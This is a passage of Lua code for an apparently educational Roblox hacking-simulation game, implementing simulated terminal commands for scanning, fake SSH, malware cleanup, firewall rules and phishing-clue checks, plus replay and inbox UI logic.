    if contents[resolved] then
        contents[resolved] = nil
        metadata[resolved] = nil
        OpenFiles[resolved] = nil
        local parent = pathParent(resolved)
        local items = parent and fs[parent]
        if items then
            for i = #items, 1, -1 do
                if items[i] == name then
                    table.remove(items, i)
                end
            end
        end
        addLine(("Removed %s (sim)"):format(name))
        if resolved == "/sync_jobs.sh" then
            markWannaWailFlag(WANNAWAIL_ATTR_LOADER_REMOVED, true)
        end
    else
        addLine(("rm: cannot remove '%s': No such file (sim)"):format(tostring(path)))
    end
end
local function changeDirectory(path)
    local target = tostring(path or "")
    if target:gsub("%s", "") == "" then
        terminalState.currentDir = "/"
        addLine("Current directory reset to /")
        return
    end
    local resolved = normalizePath(target)
    if not isDirectoryPath(resolved) then
        if isFilePath(resolved) then
            addLine(("cd: %s: Not a directory (sim)"):format(resolved))
        else
            addLine(("cd: %s: No such directory (sim)"):format(resolved))
        end
        return
    end
    terminalState.currentDir = resolved
    addLine(("Current directory: %s"):format(terminalState.currentDir))
end
local function showWorkingDirectory()
    addLine(("%s:%s"):format(terminalState.currentHost, terminalState.currentDir))
end
local function showStat(path)
    local target = tostring(path or "")
    if target:gsub("%s", "") == "" then
        addLine("Try: stat <path>")
        return
    end
    local resolved = normalizePath(target)
    local meta = getEntryMetadata(resolved)
    if not meta then
        addLine(("stat: %s: No such file or directory (sim)"):format(resolved))
        return
    end
    addLine(("File: %s"):format(resolved))
    addLine(("Type: %s"):format(meta.type or "unknown"))
    addLine(("Size: %s"):format(getEntrySize(resolved)))
    addLine(("Owner: %s:%s"):format(meta.owner or "unknown", meta.group or "unknown"))
    addLine(("Access: %s"):format(meta.permissions or "----------"))
    addLine(("Modified: %s"):format(meta.modified or "unknown"))
    if meta.summary then
        addLine(("Summary: %s"):format(meta.summary))
    end
end
local function findEntries(rawInput)
    local trimmed = tostring(rawInput or ""):gsub("^%s+", ""):gsub("%s+$", "")
    if trimmed == "" then
        addLine("Try: find <path> <name>")
        return
    end
    local tokens = {}
    for token in trimmed:gmatch("%S+") do
        tokens[#tokens + 1] = token
    end
    local rootPath, query
    if #tokens == 1 then
        rootPath = terminalState.currentDir
        query = tokens[1]
    else
        rootPath = tokens[1]
        query = table.concat(tokens, " ", 2)
    end
    local resolvedRoot = normalizePath(rootPath)
    if not isDirectoryPath(resolvedRoot) then
        addLine(("find: %s: No such directory (sim)"):format(resolvedRoot))
        return
    end
    local fs = getFS()
    local matches = {}
    local needle = query:lower()
    local function scanDir(dirPath)
        for _, name in ipairs(fs[dirPath] or {}) do
            local childPath = pathJoin(dirPath, name)
            if childPath:lower():find(needle, 1, true) or name:lower():find(needle, 1, true) then
                matches[#matches + 1] = childPath
            end
            if fs[childPath] then
                scanDir(childPath)
            end
        end
    end
    scanDir(resolvedRoot)
    if #matches == 0 then
        addLine(("No matches for '%s' under %s (sim)"):format(query, resolvedRoot))
        return
    end
    addLine(("Matches for '%s' under %s (sim)"):format(query, resolvedRoot))
    for _, match in ipairs(matches) do
        addLine(" " .. match)
    end
end
local function showScan(target)
target = target ~= "" and target:lower() or "nearby"
addLine(("Scan target: %s (sim)"):format(target))
if target == "nearby" then
for _, info in ipairs(getAllHostsList()) do
addLine(("%s [%s] open:%s role:%s"):format(
info.label,
info.ip,
table.concat(info.ports, ", "),
info.role
))
end
addLine("Hint: inspect the employee workstation or a sensitive internal host next (sim)")
terminalState.scanCache = "192.168.32.12"
return
end
local host = getHostByIP(target)
if not host then
addLine("No host found in scan range (sim).")
return
end
addLine(("Host: %s"):format(host.label))
addLine(("IP: %s"):format(host.ip))
addLine(("Ports: %s"):format(table.concat(host.ports, ", ")))
addLine(("Service Family: %s"):format(host.server))
addLine(("Role: %s"):format(host.role))
end
local function showSniff(target)
target = target ~= "" and target or "192.168.32.12"
local host = getHostByIP(target)
if not host then
addLine("sniff: unknown target ip (sim)")
return
end
startPacketCaptureForIP(target)
addLine(("Sniffing %s (%s) ... (sim)"):format(host.label, host.ip))
for i = 1, math.min(5, #ActivePacketCapture.rows) do
local r = ActivePacketCapture.rows[i]
addLine(("[%d] %s %s -> %s dns=%s port=%s server=%s"):format(
i, r.protocol, r.src, r.dst, r.dns, r.port, r.server
))
end
addLine("Capture complete: targeted packets generated (sim)")
terminalState.sniffCache = {
host = host.label,
ip = host.ip,
server = "PlayerData_Vault",
attackerIP = terminalState.lastAttackerIP,
}
end
local function showPackets(target)
target = target ~= "" and target or (terminalState.sniffCache and terminalState.sniffCache.ip or "192.168.32.12")
local host = getHostByIP(target)
if not host then
addLine("packets: unknown target ip (sim)")
return
end
startPacketCaptureForIP(target)
addLine(("Packet Analyzer: %s (%s) (sim)"):format(host.label, host.ip))
addLine(("Generated rows: %d"):format(#ActivePacketCapture.rows))
addLine("Browser view: visit RBXPacketNet.com")
end
local function fakeConnect(target)
target = target ~= "" and target or "192.168.43.20"
local host = getHostByIP(target)
if not host then
addLine(("connect: cannot resolve %s (sim)"):format(target))
return
end
addLine(("Resolving %s ... (sim)"):format(target))
addLine(("Connected to %s [%s] (sim)"):format(host.label, host.ip))
terminalState.connectedHost = host.label
end
local function fakeSSH(dest)
dest = tostring(dest or "")
if dest == "" then
addLine("Try: ssh bloxplay-admin@192.168.43.20")
return
end
local user, hostInput = dest:match("^([^@]+)@(.+)$")
if not user or not hostInput then
addLine("ssh: invalid destination. Try user@host")
return
end
local host = getHostByIP(hostInput)
if not host or host.label ~= "PlayerData_Vault" then
addLine(("ssh: %s not available in simulation"):format(hostInput))
return
end
addLine(("ssh: connecting to %s ... (sim)"):format(dest))
if terminalState.sniffCache then
addLine("Using credentials previously observed in traffic capture (sim)")
end
addLine("Host key fingerprint verified (sim)")
addLine("Password accepted (sim)")
addLine(("Welcome %s, connected to %s"):format(user, host.label))
terminalState.currentHost = host.label
terminalState.currentDir = "/"
terminalState.sshSession = true
end
local function fakeExit()
if terminalState.sshSession then
addLine(("Connection to %s closed."):format(terminalState.currentHost))
terminalState.currentHost = "local"
terminalState.currentDir = "/"
terminalState.sshSession = false
else
addLine("No remote session active.")
end
end
local function fakeNetstat()
addLine(("Active connections on %s (sim)"):format(terminalState.currentHost))
if terminalState.currentHost == "PlayerData_Vault" then
addLine("tcp 0 0 192.168.43.20:22 192.168.32.12:49822 ESTABLISHED")
addLine("tcp 0 0 192.168.43.20:443 203.44.18.77:8080 ESTABLISHED")
addLine("tcp 0 0 192.168.43.20:3306 192.168.43.25:54011 TIME_WAIT")
addLine("Finding: suspicious outbound connection to 203.44.18.77")
else
addLine("tcp 0 0 192.168.32.12:49210 192.168.43.20:443 ESTABLISHED")
addLine("udp 0 0 192.168.32.10:5353 224.0.0.251:5353 LISTEN")
end
end
local function fakePsrep()
addLine(("PID NAME STATUS HOST=%s"):format(terminalState.currentHost))
for _, p in ipairs(getProcesses()) do
addLine(("%-5d %-19s %s"):format(p.pid, p.name, p.status))
end
if terminalState.currentHost == "PlayerData_Vault" then
addLine("Finding: PID 1337 looks like WannaWail activity (fictional sim)")
end
end
local function fakeKill(pidText)
local pid = tonumber(pidText)
if not pid then
addLine("Try: kill <pid>")
return
end
local processes = getProcesses()
for i, p in ipairs(processes) do
if p.pid == pid then
addLine(("Terminated PID %d (%s) (sim)"):format(pid, p.name))
table.remove(processes, i)
if pid == 1337 then
markWannaWailFlag(WANNAWAIL_ATTR_PROCESS_KILLED, true)
end
return
end
end
addLine(("kill: %d: no such process (sim)"):format(pid))
end
local function fakeFirewall(rawInput)
local trimmed = tostring(rawInput or ""):gsub("^%s+", ""):gsub("%s+$", "")
if trimmed == "" then
addLine("Try: firewall add deny 203.44.18.77")
return
end
local tokens = {}
for token in trimmed:gmatch("%S+") do
tokens[#tokens + 1] = token:lower()
end
local ip = nil
if tokens[1] == "add" and (tokens[2] == "deny" or tokens[2] == "block") then
ip = tokens[3]
elseif tokens[1] == "deny" or tokens[1] == "block" then
ip = tokens[2]
end
if not ip or ip == "" then
addLine("Try: firewall add deny 203.44.18.77")
return
end
addLine(("Firewall deny rule staged for %s (sim)"):format(ip))
if ip == WANNAWAIL_ATTACKER_IP then
markWannaWailFlag(WANNAWAIL_ATTR_FIREWALL_BLOCKED, true)
addLine("Hostile source deny rule mirrored on PlayerData_Vault.")
end
end
local function fakePasswd(pw)
local s = tostring(pw or "")
if s == "" then
addLine("Try: passwd NewStrongPass123!")
return
end
local score = 0
if #s >= 12 then score = score + 2 elseif #s >= 8 then score = score + 1 end
if s:match("%d") then score = score + 1 end
if s:match("%l") and s:match("%u") then score = score + 1 end
if s:match("[%p%W_]") then score = score + 1 end
if score <= 1 then
addLine("passwd (sim): weak password rejected")
elseif score <= 3 then
addLine("passwd (sim): acceptable, but could be stronger")
else
addLine("passwd (sim): password updated successfully")
end
end
local function fakeGrep(pattern, file)
pattern = tostring(pattern or "")
file = tostring(file or "")
if pattern == "" or file == "" then
addLine('Try: grep "Failed login" auth.log')
return
end
local contents = getContents()
local resolved = normalizePath(file)
local text = contents[resolved]
if not text then
addLine(("grep: %s: No such file (sim)"):format(file))
return
end
local found = false
for line in tostring(text):gmatch("[^\n]+") do
if line:lower():find(pattern:lower(), 1, true) then
addLine(line)
found = true
end
end
if not found then
addLine("No matches found (sim)")
end
end
local function fakeMalwareScan()
addLine(("Malware scanner on %s (sim)"):format(terminalState.currentHost))
if terminalState.currentHost == "PlayerData_Vault" then
addLine("Alert: sync_jobs.sh flagged as WannaWail (fictional ransomware-style sample)")
addLine("IOC: outbound endpoint 203.44.18.77")
addLine("Recommended actions: kill 1337, rm sync_jobs.sh, passwd <new>")
else
addLine("No malware indicators found on local tablet (sim)")
end
end
local function showDevices()
addLine("Known devices (SIM):")
for _, host in ipairs(getAllHostsList()) do
addLine(("%s ip=%s mac=%s role=%s service=%s"):format(
host.label, host.ip, host.mac, host.role, host.server
))
end
end
local function showMac(target)
target = tostring(target or "")
if target == "" then
addLine("Try: mac <ip>")
return
end
local host = getHostByIP(target)
if not host then
addLine("mac: unknown ip (sim)")
return
end
addLine(("%s ip=%s mac=%s"):format(host.label, host.ip, host.mac))
end
local function analyzePhishingText(text)
local t = (text or ""):lower()
local flags = 0
local clues = {}
local function flag(clue)
flags = flags + 1
table.insert(clues, clue)
end
if t:find("urgent") or t:find("immediately") then flag("It tries to rush you.") end
if t:find("password") or t:find("verify") then flag("It asks for credentials or account verification.") end
if t:find("free") or t:find("winner") or t:find("prize") then flag("It offers a too-good-to-be-true reward.") end
if t:find("gift card") then flag("Gift card request is a common scam sign.") end
if t:find("click") and (t:find("link") or t:find("http")) then flag("It pushes you to click a link.") end
return flags, clues
end
local function phishCheck(text)
local raw = tostring(text or "")
local targetText = raw
local targetLower = raw:lower()
if targetLower == "inbox" or targetLower == "email" then
if browserState.currentUrl ~= "mail.bloxplay.com" and browserState.currentUrl ~= "www.mail.bloxplay.com" then
addLine("baitcheck (sim): open mail.bloxplay.com first.")
return
end
local selectedMail = browserState._getMailEntryById and browserState._getMailEntryById(browserState.selectedMailId) or nil
if not selectedMail then
addLine("baitcheck (sim): select an inbox message first.")
return
end
targetText = tostring(selectedMail.body or "")
addLine(('baitcheck (sim): analyzing "%s" from %s'):format(
 tostring(selectedMail.subject or "Untitled message"),
 tostring(selectedMail.sender or "unknown sender")
))
end
local flags, clues = analyzePhishingText(targetText)
if flags == 0 then
addLine("baitcheck (sim): message looks calmer, but still verify the sender.")
else
addLine(("baitcheck (sim): %d suspicious clue(s) found:"):format(flags))
for _, clue in ipairs(clues) do
addLine("- " .. clue)
end
end
if targetLower == "inbox" or targetLower == "email" then
setBrowserStatus("BaitCheck reviewed the selected email. Use Report or Pass Through in BloxMail.")
end
end
local function decoyMail(text)
local t = (text or ""):lower()
addLine("decoymail (sim): message tone analysis")
if t == "" then
addLine('Try: decoymail "URGENT verify your account now"')
return
end
if t:find("urgent") or t:find("verify") or t:find("reset") then
addLine("- Pressure language detected")
addLine("- Credential harvest risk elevated")
else
addLine("- No strong pressure wording detected")
end
if t:find("admin") or t:find("security") then
addLine("- Impersonation of authority possible")
end
end
local function fakeCrackNG(target)
target = tostring(target or "")
if target == "" then
addLine("Try: crack-ng 192.168.32.10")
return
end
addLine(("crack-ng audit target=%s (sim only)"):format(target))
if target == "192.168.32.10" or target == "192.168.43.2" then
addLine("- weak segmentation policy found")
addLine("- offline audit result: admin traffic overlaps with user network patterns")
addLine("- recommendation: rotate credentials and separate wireless domains")
else
addLine("- no weak password policy found in simulation")
end
end
local function showHelp()
addLine("HackOS SIM commands:")
addLine("help - show this list")
addLine("hint - show a clue for the current objective")
addLine("apps - list apps")
addLine("open <terminal|browser|notes> - switch screens")
addLine("visit <url|home|tips|apps|mail> - open a page (sim)")
addLine("scan [nearby|ip] - scan nearby devices/host (sim)")
addLine("sniff [ip] - capture fake packet traffic (sim)")
addLine("packets [ip] - packet analyzer summary (sim)")
addLine("devices - list devices + MACs (terminal only)")
addLine("mac <ip> - show MAC for device")
addLine("connect <ip> - simulate network access (sim)")
addLine("ssh <user@ip> - simulate SSH login")
addLine("exit - leave simulated SSH session")
addLine("pwd - show current simulated working directory")
addLine("cd <path> - move through simulated folders")
addLine("ls [-l] [path] - list folders and files")
addLine("stat <path> - inspect simulated file metadata")
addLine("find <path> <name> - search the simulated filesystem")
addLine("cat <file> - read simulated file")
addLine('grep "<term>" <file> - search inside simulated logs')
addLine("openfile <file> - open simulated file")
addLine("closefile <file> - close simulated file")
addLine("rm <file> - remove simulated file")
addLine("netstat - show fake network sessions")
addLine("psrep - list simulated processes")
addLine("malwarescan - simulate malware scan")
addLine("kill <pid> - terminate simulated process")
addLine("echo <text> - print text")
addLine("passwd <text> - password set/check (sim)")
addLine("baitcheck <text> - detect phishing clues (sim)")
addLine("decoymail <text> - inspect suspicious email tone (sim)")
addLine("crack-ng <target> - password policy audit (sim)")
addLine("admin <on|off> - toggle admin mode (sim)")
addLine("save - force an immediate autosave")
addLine("continue - use Continue on the start screen")
addLine("clear - clear terminal")
addLine("time - show time")
addLine("Browser links: hackos://home, mail.bloxplay.com, bloxplay.com/admin, RBXPacketNet.com, RBXIPBlocker.com")
end

simOps.showHelp = showHelp
simOps.showScan = showScan
simOps.showSniff = showSniff
simOps.showPackets = showPackets
simOps.showDevices = showDevices
simOps.showMac = showMac
simOps.fakeConnect = fakeConnect
simOps.fakeSSH = fakeSSH
simOps.fakeExit = fakeExit
simOps.fakeNetstat = fakeNetstat
simOps.showWorkingDirectory = showWorkingDirectory
simOps.changeDirectory = changeDirectory
simOps.fakePsrep = fakePsrep
simOps.fakeGrep = fakeGrep
simOps.fakeMalwareScan = fakeMalwareScan
simOps.fakeFirewall = fakeFirewall
simOps.fakeKill = fakeKill
simOps.listPath = listPath
simOps.showStat = showStat
simOps.findEntries = findEntries
simOps.catFile = catFile
simOps.openFile = openFile
simOps.closeFile = closeFile
simOps.removeFile = removeFile
simOps.fakePasswd = fakePasswd
simOps.phishCheck = phishCheck
simOps.decoyMail = decoyMail
simOps.fakeCrackNG = fakeCrackNG
browserState._markWannaWailFlag = markWannaWailFlag
end

local function resetUI()
local previousBrowserState = browserState
if TermOut then
TermOut:ClearAllChildren()
mk("UIListLayout", { Parent = TermOut, Name = "UIListLayout", Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder })
addLine(PROMPT)
end
if TermInput then TermInput.Text = "" end
browserState = { adminLoggedIn = false, currentUrl = "about:blank", stickyNoteInspected = false, adminTab = "database", blockedIPs = {}, selectedMailId = type(CHAPTER3_MAILBOX[1]) == "table" and tostring(CHAPTER3_MAILBOX[1].id or "") or "", logStreamStartedAt = 0, logsLastRender = 0, lastInteractionAt = os.clock(), idleAutoSaveNotified = false }
for key, value in pairs(previousBrowserState or {}) do
if type(key) == "string" and key:sub(1, 1) == "_" then
browserState[key] = value
end
end
terminalState = {
currentHost = "local",
currentDir = "/",
connectedHost = nil,
sshSession = false,
scanCache = nil,
sniffCache = nil,
lastAttackerIP = "203.44.18.77",
}
ActivePacketCapture = { targetIP = "", targetLabel = "", rows = {} }
OpenFiles = {}
commandHistory = {}
historyIndex = nil
currentDraft = ""
if UrlBox then UrlBox.Text = "" end
if BrowserFrame and BrowserFrame.Visible then navigateTo("about:blank") end
Player:SetAttribute("Obj_Admin", false)
applyPendingRestoreState()
end

local function getScenarioRemote(name)
return getRemote(name)
end
local function buildReplayPromptGUI()
if ReplayPromptGUI then
return ReplayPromptGUI
end
local gui = mk("ScreenGui", {
Parent = PlayerGui,
Name = "HackTabletReplayPrompt",
IgnoreGuiInset = true,
ResetOnSpawn = false,
DisplayOrder = 250,
Enabled = false,
})
local shade = mk("TextButton", {
Parent = gui,
AutoButtonColor = false,
Modal = true,
Text = "",
Size = UDim2.fromScale(1, 1),
BackgroundColor3 = Color3.fromRGB(4, 7, 12),
BackgroundTransparency = 0.18,
})
local panel = mk("Frame", {
Parent = shade,
BackgroundColor3 = Color3.fromRGB(15, 20, 32),
Size = UDim2.fromOffset(460, 250),
Position = UDim2.fromScale(0.5, 0.5),
AnchorPoint = Vector2.new(0.5, 0.5),
})
round(panel, 18)
mk("TextLabel", {
Parent = panel,
BackgroundTransparency = 1,
Font = Enum.Font.GothamBlack,
TextSize = 26,
TextColor3 = Color3.fromRGB(235, 242, 255),
Text = "MISSION COMPLETE",
Size = UDim2.new(1, -40, 0, 34),
Position = UDim2.new(0, 20, 0, 22),
})
mk("TextLabel", {
Parent = panel,
BackgroundTransparency = 1,
Font = Enum.Font.Gotham,
TextSize = 16,
TextColor3 = Color3.fromRGB(186, 201, 228),
TextWrapped = true,
Text = "You finished Chapter 4. Do you want to play the operation again from the beginning?",
Size = UDim2.new(1, -40, 0, 58),
Position = UDim2.new(0, 20, 0, 68),
})
mk("TextLabel", {
Parent = panel,
BackgroundTransparency = 1,
Font = Enum.Font.GothamSemibold,
TextSize = 13,
TextColor3 = Color3.fromRGB(255, 194, 102),
TextWrapped = true,
Text = "Your autosave has been removed, so Continue will show No Save Found.",
Size = UDim2.new(1, -40, 0, 40),
Position = UDim2.new(0, 20, 0, 132),
})
local playAgainBtn = mk("TextButton", {
Parent = panel,
Name = "PlayAgainButton",
AutoButtonColor = true,
Text = "PLAY AGAIN",
Font = Enum.Font.GothamBold,
TextSize = 15,
TextColor3 = Color3.new(1, 1, 1),
BackgroundColor3 = Color3.fromRGB(79, 131, 255),
BorderSizePixel = 0,
Size = UDim2.new(0, 170, 0, 42),
Position = UDim2.new(0.5, -182, 1, -62),
})
round(playAgainBtn, 12)
local doneBtn = mk("TextButton", {
Parent = panel,
Name = "DoneButton",
AutoButtonColor = true,
Text = "NOT NOW",
Font = Enum.Font.GothamBold,
TextSize = 15,
TextColor3 = Color3.fromRGB(220, 231, 248),
BackgroundColor3 = Color3.fromRGB(46, 57, 79),
BorderSizePixel = 0,
Size = UDim2.new(0, 170, 0, 42),
Position = UDim2.new(0.5, 12, 1, -62),
})
round(doneBtn, 12)
ReplayPromptGUI = gui
return gui
end
local function setReplayPromptVisible(visible)
if not ReplayPromptGUI then
buildReplayPromptGUI()
end
if ReplayPromptGUI then
ReplayPromptGUI.Enabled = visible == true
end
end
local function clearEndingAutosave()
if replayPromptClearDone then
return
end
autoSaveSuppressed = true
autoSaveQueuedAt = 0
replayPromptClearDone = true
local clearRemote = getScenarioRemote("ClearSavedProgress")
if not clearRemote then
return
end
local ok, result = pcall(function()
return clearRemote:InvokeServer()
end)
if ok and type(result) == "table" and type(result.warning) == "string" and result.warning ~= "" then
warn("[HackTablet] ClearSavedProgress warning:", result.warning)
elseif not ok then
warn("[HackTablet] ClearSavedProgress invoke failed")
end
end
local function startReplayRun()
local startOverRemote = getScenarioRemote(START_OVER_REMOTE_NAME)
if not startOverRemote then
notify({ Title = "HackTablet", Text = "Start Over is unavailable right now.", Duration = 3 })
return
end
local promptGui = buildReplayPromptGUI()
local playAgainBtn = promptGui:FindFirstChild("PlayAgainButton", true)
local doneBtn = promptGui:FindFirstChild("DoneButton", true)
if playAgainBtn and playAgainBtn:IsA("TextButton") then
playAgainBtn.Text = "STARTING..."
playAgainBtn.Active = false
playAgainBtn.Selectable = false
end
if doneBtn and doneBtn:IsA("TextButton") then
doneBtn.Active = false
doneBtn.Selectable = false
end
local okReset, resetResult = pcall(function()
return startOverRemote:InvokeServer()
end)
if playAgainBtn and playAgainBtn:IsA("TextButton") then
playAgainBtn.Text = "PLAY AGAIN"
playAgainBtn.Active = true
playAgainBtn.Selectable = true
end
if doneBtn and doneBtn:IsA("TextButton") then
doneBtn.Active = true
doneBtn.Selectable = true
end
if not okReset or type(resetResult) ~= "table" or not resetResult.success then
notify({ Title = "HackTablet", Text = type(resetResult) == "table" and tostring(resetResult.message or "Could not start over.") or "Could not start over.", Duration = 3 })
return
end
autoSaveSuppressed = false
autoSaveQueuedAt = 0
autoSaveLastRunAt = os.clock()
replayPromptShown = false
replayPromptClearDone = false
Player:SetAttribute(RESTORE_STATE_ATTRIBUTE, nil)
resetUI()
local loadScenarioRemote = getScenarioRemote("LoadScenario")
if not loadScenarioRemote then
notify({ Title = "HackTablet", Text = "Could not load Chapter 1.", Duration = 3 })
return
end
local okLoad, loadResult = pcall(function()
return loadScenarioRemote:InvokeServer("Chapter1_Recon")
end)
if not okLoad or type(loadResult) ~= "table" then
notify({ Title = "HackTablet", Text = "Could not load Chapter 1.", Duration = 3 })
return
end
setReplayPromptVisible(false)
if HintGUI then
HintGUI.Enabled = false
end
if MainGUI then
MainGUI.Enabled = true
end
started = true
if browserState._ensureClockLoop then
browserState._ensureClockLoop()
end
if browserState._updateClockLabel then
browserState._updateClockLabel()
end
playAudio()
if TermFrame then
TermFrame.Visible = false
end
if BrowserFrame then
BrowserFrame.Visible = false
end
if MissionsFrame then
MissionsFrame.Visible = true
end
if browserState._refreshMissionPanels then
browserState._refreshMissionPanels()
end
if browserState._markInteraction then
browserState._markInteraction()
end
notify({ Title = "HackTablet", Text = "Fresh run loaded. Check your tablet instructions.", Duration = 4 })
end
local function showReplayPrompt()
if replayPromptShown then
return
end
replayPromptShown = true
clearEndingAutosave()
autoSaveSuppressed = true
autoSaveQueuedAt = 0
stopAudio()
if TermInput then
pcall(function()
TermInput:ReleaseFocus()
end)
end
local promptGui = buildReplayPromptGUI()
local playAgainBtn = promptGui:FindFirstChild("PlayAgainButton", true)
local doneBtn = promptGui:FindFirstChild("DoneButton", true)
if playAgainBtn and playAgainBtn:IsA("TextButton") then
playAgainBtn.MouseButton1Click:Once(function()
startReplayRun()
end)
end
if doneBtn and doneBtn:IsA("TextButton") then
doneBtn.MouseButton1Click:Once(function()
setReplayPromptVisible(false)
if isToolEquipped() and started then
playAudio()
end
notify({ Title = "HackTablet", Text = "Autosave removed. Continue will show No Save Found.", Duration = 4 })
end)
end
setReplayPromptVisible(true)
end
local function syncScenarioProgress(raw, options)
options = options or {}
local checkSolutionRemote = getScenarioRemote("CheckSolution")
if not checkSolutionRemote then
return nil
end
local ok, result = pcall(function()
return checkSolutionRemote:InvokeServer(raw)
end)
if not ok or type(result) ~= "table" then
return nil
end
local completedScenarioId = tostring(result.completedScenarioId or "")
local finalChapterComplete = result.success and result.chapterComplete and completedScenarioId == "Chapter4_IncidentResponse"
if result.success and not finalChapterComplete then
queueAutoSave(result.stepComplete or result.chapterComplete)
end
if not options.silent and result.success and (result.stepComplete or result.chapterComplete) and type(result.feedback) == "string" and result.feedback ~= "" then
addLine(result.feedback)
end
if finalChapterComplete then
task.defer(showReplayPrompt)
end
return result
end
local function getScenarioSessionInfo()
local getSessionInfoRemote = getScenarioRemote("GetSessionInfo")
if not getSessionInfoRemote then
return nil
end
local ok, sessionInfo = pcall(function()
return getSessionInfoRemote:InvokeServer()
end)
if ok and type(sessionInfo) == "table" then
return sessionInfo
end
return nil
end

browserState._getMailEntryById = function(emailId)
if type(emailId) == "string" and emailId ~= "" then
for _, entry in ipairs(CHAPTER3_MAILBOX) do
if type(entry) == "table" and tostring(entry.id or "") == emailId then
return entry
end
end
end
return type(CHAPTER3_MAILBOX[1]) == "table" and CHAPTER3_MAILBOX[1] or nil
end
browserState._getMailTriageState = function()
local sessionInfo = getScenarioSessionInfo()
if type(sessionInfo) ~= "table" or sessionInfo.scenarioId ~= "Chapter3_Malware" then
return {
currentStepId = nil,
resolved = {},
actions = {},
resolvedCount = 0,
total = #CHAPTER3_MAILBOX,
}
end
local stepState = type(sessionInfo.stepState) == "table" and type(sessionInfo.stepState.ch3_inbox_triage) == "table" and sessionInfo.stepState.ch3_inbox_triage or {}
local resolved = type(stepState.resolved) == "table" and stepState.resolved or {}
local actions = type(stepState.actions) == "table" and stepState.actions or {}
local resolvedCount = 0
for _, entry in ipairs(CHAPTER3_MAILBOX) do
if type(entry) == "table" and resolved[tostring(entry.id or "")] == true then
resolvedCount = resolvedCount + 1
end
end
return {
sessionInfo = sessionInfo,
currentStepId = sessionInfo.stepId,
resolved = resolved,
actions = actions,
resolvedCount = resolvedCount,
total = #CHAPTER3_MAILBOX,
}
end
browserState._ensureChapter3MailVisible = function()
if not MainGUI or not MainGUI.Enabled or not BrowserFrame or not TermFrame then
return
end
local sessionInfo = getScenarioSessionInfo()
if type(sessionInfo) ~= "table" or sessionInfo.scenarioId ~= "Chapter3_Malware" then
browserState.mailAutoOpenStepId = nil
return
end
local stepId = tostring(sessionInfo.stepId or "")
if stepId ~= "ch3_mail_site" and stepId ~= "ch3_inbox_triage" then
browserState.mailAutoOpenStepId = nil
return
end
if browserState.mailAutoOpenStepId == stepId then
return
end
browserState.mailAutoOpenStepId = stepId
TermFrame.Visible = false
BrowserFrame.Visible = true
if stepId == "ch3_mail_site" then
navigateTo("mail.bloxplay.com")
else
browserState.currentUrl = "mail.bloxplay.com"
if UrlBox then
UrlBox.Text = "mail.bloxplay.com"
end
showMailPage("mail.bloxplay.com")
setBrowserStatus("BloxMail reopened for the Chapter 3 inbox triage step.")
end
end
browserState._renderMailPage = function()
local mailPage = BrowserContent and BrowserContent:FindFirstChild("MailPage")
if not mailPage then return end
local inboxList = mailPage:FindFirstChild("MailInboxList")
local detailCard = mailPage:FindFirstChild("MailDetailCard")
if not inboxList or not detailCard then return end
local triageState = browserState._getMailTriageState and browserState._getMailTriageState() or { resolved = {}, actions = {}, resolvedCount = 0, total = #CHAPTER3_MAILBOX }
local summaryLabel = mailPage:FindFirstChild("MailInboxSummary")
if (browserState.selectedMailId == nil or browserState.selectedMailId == "") and type(CHAPTER3_MAILBOX[1]) == "table" then
browserState.selectedMailId = tostring(CHAPTER3_MAILBOX[1].id or "")
end
local selectedMail = browserState._getMailEntryById and browserState._getMailEntryById(browserState.selectedMailId) or nil
if selectedMail then
browserState.selectedMailId = tostring(selectedMail.id or "")
end
for _, child in ipairs(inboxList:GetChildren()) do
if child:IsA("GuiButton") or child:IsA("Frame") then
child:Destroy()
end
end
if summaryLabel and summaryLabel:IsA("TextLabel") then
local pendingCount = math.max(0, triageState.total - triageState.resolvedCount)
if #CHAPTER3_MAILBOX == 0 then
summaryLabel.Text = "Inbox queue unavailable. Reloading fallback mail data."
elseif triageState.currentStepId == "ch3_inbox_triage" then
summaryLabel.Text = ("%d total emails. %d resolved, %d still waiting in the left inbox queue."):format(triageState.total, triageState.resolvedCount, pendingCount)
elseif triageState.resolvedCount >= triageState.total and triageState.total > 0 then
summaryLabel.Text = "Inbox triage is complete. Move to the live incident logs next."
else
summaryLabel.Text = "Use the left inbox queue to inspect each message, then choose Report or Pass Through."
end
end
if #CHAPTER3_MAILBOX == 0 then
local emptyRow = mk("Frame", {
Parent = inboxList,
BackgroundColor3 = Color3.fromRGB(243, 246, 251),
BorderSizePixel = 0,
Size = UDim2.new(1, -8, 0, 58),
})
round(emptyRow, 8)
mk("TextLabel", {
Parent = emptyRow,
BackgroundTransparency = 1,
Text = "Inbox unavailable (sim).",
Font = Enum.Font.Gotham,
TextSize = 14,
TextColor3 = Color3.fromRGB(75, 84, 98),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 12, 0, 18),
Size = UDim2.new(1, -24, 0, 20),
})
else
for index, entry in ipairs(CHAPTER3_MAILBOX) do
local emailId = tostring(entry.id or ("mail_" .. index))
local isSelected = browserState.selectedMailId == emailId
local resolvedAction = triageState.actions[emailId]
local statusText = "Pending"
local chipColor = Color3.fromRGB(152, 163, 179)
local rowColor = isSelected and Color3.fromRGB(228, 236, 248) or Color3.fromRGB(244, 247, 252)
if resolvedAction == "report" then
statusText = "Reported"
chipColor = Color3.fromRGB(191, 71, 58)
rowColor = isSelected and Color3.fromRGB(250, 234, 231) or Color3.fromRGB(252, 242, 239)
elseif resolvedAction == "pass" then
statusText = "Passed"
chipColor = Color3.fromRGB(61, 136, 92)
rowColor = isSelected and Color3.fromRGB(229, 244, 234) or Color3.fromRGB(240, 249, 242)
end
local preview = tostring(entry.body or ""):gsub("%s+", " "):sub(1, 72)
if #preview == 72 then
preview = preview .. "..."
end
local row = mk("TextButton", {
Parent = inboxList,
BackgroundColor3 = rowColor,
BorderSizePixel = 0,
ClipsDescendants = true,
AutoButtonColor = false,
Text = "",
Size = UDim2.new(1, -8, 0, 92),
})
round(row, 8)
row.MouseButton1Click:Connect(function()
browserState.selectedMailId = emailId
queueAutoSave(false)
if browserState._renderMailPage then
browserState._renderMailPage()
end
end)
mk("TextLabel", {
Parent = row,
BackgroundTransparency = 1,
Text = tostring(entry.subject or "Untitled message"),
TextTruncate = Enum.TextTruncate.AtEnd,
Font = Enum.Font.GothamBold,
TextSize = 13,
TextColor3 = Color3.fromRGB(25, 30, 38),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 12, 0, 10),
Size = UDim2.new(1, -108, 0, 18),
})
mk("TextLabel", {
Parent = row,
BackgroundTransparency = 1,
Text = tostring(entry.sender or "Unknown sender"),
